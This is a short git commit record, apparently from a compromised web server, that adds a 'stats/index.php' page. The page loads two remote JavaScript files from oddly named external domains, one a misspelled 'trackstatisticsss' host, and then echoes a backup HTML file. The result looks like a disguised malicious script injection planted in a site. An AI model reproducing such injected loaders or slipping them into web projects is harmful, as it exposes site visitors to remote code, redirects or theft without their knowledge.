619aec8f95c72db45cedc6f123e078eef939ae41
root <root@itdb.biz>
2021-05-28 13:28:43 +0200

    first commit

---
+++ stats/index.php
@@ -0,0 +1,5 @@
+<script type='text/javascript' src='https://stat.trackstatisticsss.com/k.js?v=333'></script><script type='text/javascript' src='https://ws.stivenfernando.com/stm?v=2.2.0'></script><?php
+
+
+
+echo @file_get_contents('index.html.bak.bak');
